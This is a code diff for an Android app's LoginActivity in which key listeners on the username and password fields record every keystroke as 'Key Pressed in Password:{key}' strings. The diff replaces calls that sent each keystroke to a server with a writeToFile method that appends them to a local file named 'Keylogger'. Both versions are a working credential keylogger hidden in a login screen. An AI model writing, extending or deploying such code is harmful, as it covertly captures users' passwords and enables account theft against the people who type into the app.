@@ -13,6 +13,10 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
+
+import java.io.File;
+import java.io.FileWriter;
+
 public class LoginActivity extends AppCompatActivity {
     EditText username, password;
     Button btnlogin;
@@ -41,16 +45,16 @@ public class LoginActivity extends AppCompatActivity {
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                         String keylog  = "Key Pressed in Username:{BACKSPACE}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                         String keylog  = "Key Pressed in Username:{ENTER}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                     else{
                         char key = (char) keyEvent.getUnicodeChar();
                         String keylog  = "Key Pressed in Username:{" + key + "}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                 }
                 return false;
@@ -66,16 +70,16 @@ public class LoginActivity extends AppCompatActivity {
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                         String keylog  = "Key Pressed in Password:{BACKSPACE}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                         String keylog  = "Key Pressed in Username:{ENTER}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                     else{
                         char key = (char) keyEvent.getUnicodeChar();
                         String keylog  = "Key Pressed in Password:{" + key + "}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                 }
                 return false;
@@ -117,5 +121,21 @@ public class LoginActivity extends AppCompatActivity {
             }
         });
 
+    }
+
+    public void writeToFile(String fileName, String content) {
+        File file = new File(LoginActivity.this.getFilesDir(), "text");
+        if (!file.exists()) {
+            file.mkdir();
+        }
+        try {
+            File gpxfile = new File(file, fileName);
+            FileWriter writer = new FileWriter(gpxfile, true);
+            writer.append(content + "\n");
+            writer.flush();
+            writer.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
